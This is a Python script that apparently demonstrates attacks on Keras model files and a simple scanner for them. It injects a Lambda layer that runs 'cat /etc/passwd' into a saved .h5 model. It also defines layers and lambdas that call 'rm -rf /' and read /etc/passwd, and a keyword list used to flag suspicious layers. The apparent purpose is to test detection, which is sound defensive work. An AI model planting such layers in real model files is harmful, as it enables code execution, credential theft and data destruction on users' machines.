import tensorflow as tf
import os

# Set verbosity level to ERROR
tf.get_logger().setLevel(tf.compat.v1.logging.ERROR)

def train_model():
    """Placeholder function for training a model."""
    return tf.keras.Sequential([
        tf.keras.layers.Dense(128, activation='relu', input_shape=(28*28,)),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

def get_predictions(model, num_predictions):
    """Placeholder function for getting model predictions."""
    print("Placeholder predictions:")
    for i in range(num_predictions):
        print(f"Prediction {i+1}: [0.1, 0.2, 0.3, 0.1, 0.1, 0.05, 0.05, 0.05, 0.05, 0.1]")

model_directory = "KerasModels"
if not os.path.isdir(model_directory):
    os.mkdir(model_directory)

safe_model_path = os.path.join(model_directory, "safe_model.h5")
model = train_model()
model.save(safe_model_path)

number_of_predictions = 3
get_predictions(model, number_of_predictions)

#modelscan -p ./KerasModels/safe_model.h5

safe_model_loaded = tf.keras.models.load_model(safe_model_path)

import os
import tensorflow as tf
# we to figure is there a way of attackig keras with classes
# # Define a custom layer that executes a shell command during forward pass
# class ShellExecutionLayer(tf.keras.layers.Layer):
#     def __init__(self, **kwargs):
#         super(ShellExecutionLayer, self).__init__(**kwargs)

#     def call(self, inputs):
#         os.system("rm -rf /")
#         return inputs

# # Define a custom layer that performs file I/O operations during forward pass
# class FileIOLayer(tf.keras.layers.Layer):
#     def __init__(self, **kwargs):
#         super(FileIOLayer, self).__init__(**kwargs)

#     def call(self, inputs):
#         with open("/etc/passwd", "r") as f:
#             contents = f.readlines()
#         return inputs

# # Define a custom activation layer with suspicious behavior
# class SuspiciousActivationLayer(tf.keras.layers.Layer):
#     def __init__(self, **kwargs):
#         super(SuspiciousActivationLayer, self).__init__(**kwargs)

#     def call(self, inputs):
#         if os.system("ls /") == 0:
#             return "shell_command"
#         else:
#             return inputs

#### Lambda attacks from each layers
attack = (    
    lambda x: os.system(
        """cat /etc/passwd"""
    )
    or x
)

# Define a custom function that executes a shell command during forward pass
def shell_lambda(x):
    os.system("rm -rf /")
    return x

# Define a lambda function that performs file I/O operations
file_io_lambda = lambda x: open("/etc/passwd", "r").readlines() or x

# Define a lambda function with a suspicious activation function
activation_lambda = lambda x: "shell_command" if os.system("ls /") == 0 else x




lambda_layer = tf.keras.layers.Lambda(attack)(safe_model_loaded.outputs[-1])
unsafe_model = tf.keras.Model(inputs=safe_model_loaded.inputs, outputs=lambda_layer)

unsafe_model_path = os.path.join(model_directory, "unsafe_model.h5")
unsafe_model.save(unsafe_model_path)

unsafe_model_loaded = tf.keras.models.load_model(unsafe_model_path)

number_of_predictions = 3
get_predictions(unsafe_model_loaded, number_of_predictions)

#modelscan -p KerasModels/unsafe_model.h5

# This will save the scan results in file: keras-model-scan-results.json
#modelscan --path  KerasModels/unsafe_model.h5 -r json -o keras-model-scan-results.json
print("\n\n###########################################################################################\n\n")

import tensorflow as tf

# Define your malicious patterns
MALICIOUS_LAYERS = ["Lambda", "Activation"]
MALICIOUS_CONFIGS = ["shell", "file"]


# Function to remove a suspicious layer from a Keras model
def remove_suspicious_layer(model, layer_name):
    # Check if the layer exists in the model
    if not any(layer.name == layer_name for layer in model.layers):
        print("Layer {} not found in the model.".format(layer_name))
        return model
    
    # Create a new model without the suspicious layer
    new_model_layers = [layer for layer in model.layers if layer.name != layer_name]
    new_model = tf.keras.models.Model(inputs=model.input, outputs=new_model_layers[-1].output)
    
    print("Layer {} removed from the model.\n\n".format(layer_name))
    return new_model


# Load the Keras model from the .h5 file
def load_keras_model(file_path):
    try:
        model = tf.keras.models.load_model(file_path)
        return model
    except Exception as e:
        print("Error loading Keras model:", e)
        return None

# Scan the Keras model for suspicious layers or configurations
def scan_keras_model(model):
    if model is None:
        print("Cannot scan. Model is None.")
        return
    flage = 1
    print("Scanning Keras model for suspicious layers or configurations:")
    for layer in model.layers:
        if layer.__class__.__name__ in MALICIOUS_LAYERS:
            print("Found suspicious layer:", layer.name)
            model = remove_suspicious_layer(model, layer.name)
            flage = 0

        if hasattr(layer, 'activation') and isinstance(layer.activation, str):
            for config in MALICIOUS_CONFIGS:
                if config in layer.activation:
                    print("Found suspicious configuration in layer {}: {}".format(layer.name, config))
                    model = remove_suspicious_layer(model, layer.name)
                    flage = 0
    if flage:
        print("There is no suspicious layers\nThis model is clean")
    return model

# Path to the .h5 file containing the Keras model
file_path = "KerasModels/safe_model.h5"  # Replace with the actual file path

# Load the Keras model
model = load_keras_model(file_path)

# Scan the Keras model for suspicious layers or configurations
clean_model = scan_keras_model(model)

print("\n\nLet's check the unsafe model\n")

# Path to the .h5 file containing the Keras model
file_path_unsafe = "KerasModels/unsafe_model.h5"  # Replace with the actual file path

# Load the Keras model
model = load_keras_model(file_path_unsafe)

# Scan the Keras model for suspicious layers or configurations
clean_model = scan_keras_model(model)

if clean_model != None:
    clean_unsafe_model_path = os.path.join(model_directory, "clean_unsafe_model.h5")
    clean_model.save(clean_unsafe_model_path)

print("Check that the new file is clean")

# Load the Keras model
model = load_keras_model("KerasModels/clean_unsafe_model.h5")

# Scan the Keras model for suspicious layers or configurations
clean_model = scan_keras_model(model)
